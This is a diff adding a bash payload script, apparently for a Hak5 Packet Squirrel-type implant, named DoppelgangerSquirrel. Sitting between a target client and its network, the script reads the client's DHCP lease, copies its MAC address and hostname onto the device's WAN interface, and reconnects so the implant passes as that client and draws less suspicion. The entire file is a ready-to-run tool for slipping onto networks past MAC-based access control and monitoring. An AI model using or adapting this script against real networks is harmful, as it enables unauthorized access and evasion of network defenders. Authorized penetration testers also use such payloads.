@@ -1,0 +1,90 @@
+#!/bin/bash
+
+# Title:        DoppelgangerSquirrel
+# Author:       0i41E
+# Version:	1.0
+# Description: 	Spoof your targets hostname and MAC address to appear less suspicious to the target network.
+#
+# Usage: Power up your squirrel while your target client is attached. After the LED blinks green and shortly after shuts itself off, you successfully became the client, by connecting to the target network.
+
+LED SPECIAL2 
+
+# Define the network interface and the file with DHCP leases, as well as NETMODE paths
+# eth0 usually is connected to the target network, while eth1 is meant to be connected to the client
+NETWORK_INTERFACE="eth0"
+LEASES_FILE="/tmp/dhcp.leases"
+NAT_CONFIG="/usr/lib/network_config/nat"
+NAT_BACKUP="/usr/lib/network_config/nat_backup"
+
+# Backup original NAT config
+if [ ! -f "$NAT_BACKUP" ]; then
+    cp "$NAT_CONFIG" "$NAT_BACKUP"
+fi
+
+# Restore from clean base - just in case
+cp "$NAT_BACKUP" "$NAT_CONFIG"
+
+# Force WAN (eth0) to NOT auto start, isolating the client, while not exposing the squirrel to the network (Not 100% safe though - so better wait for payload has finsished)
+sed -i "/config interface 'wan'/,/config interface/ {
+    /option proto 'dhcp'/a \        option auto '0'
+}" "$NAT_CONFIG"
+
+
+# Set Network mode - modified NAT
+NETMODE NAT
+LED SETUP
+
+# Define loop time for DHCP lease
+WAIT_TIME=60
+ELAPSED=0
+
+#Wait for DHCP lease in a loop to get client info
+while [ $ELAPSED -lt $WAIT_TIME ]; do
+    if [ -s "$LEASES_FILE" ]; then
+        LAST_LEASE=$(tail -n 1 "$LEASES_FILE")
+        MAC_ADDRESS=$(echo "$LAST_LEASE" | awk '{print $2}')
+        HOSTNAME=$(echo "$LAST_LEASE" | awk '{print $4}')
+
+        if [ -n "$MAC_ADDRESS" ] && [ -n "$HOSTNAME" ]; then
+            break
+        fi
+    fi
+
+    LED STAGE3
+    sleep 1
+    ELAPSED=$((ELAPSED + 1))
+done
+
+# Validate DHCP Lease extraction
+if [ -z "$MAC_ADDRESS" ] || [ -z "$HOSTNAME" ]; then
+    LED R BLINKING
+    sleep 2
+    LED R SOLID
+    exit 1
+fi
+
+LED B FAST
+
+# Change MAC address of the eth0 to mimic target client
+ifconfig "$NETWORK_INTERFACE" hw ether "$MAC_ADDRESS"
+
+# Remove 'option auto 0' so eth0 can start normally
+sed -i "/config interface 'wan'/,/config interface/ {
+    /option auto '0'/d
+}" "$NAT_CONFIG"
+
+# Insert MAC after 'option proto dhcp' inside WAN block
+sed -i "/config interface 'wan'/,/config interface/ {
+    /option proto 'dhcp'/a \        option macaddr '$MAC_ADDRESS'
+}" "$NAT_CONFIG"
+
+## Change the system hostname using uci
+uci set system.@system[0].hostname="$HOSTNAME"
+uci commit system
+
+#Rerun modified NAT mode
+NETMODE NAT
+
+LED G BLINKING
+sleep 5
+LED OFF
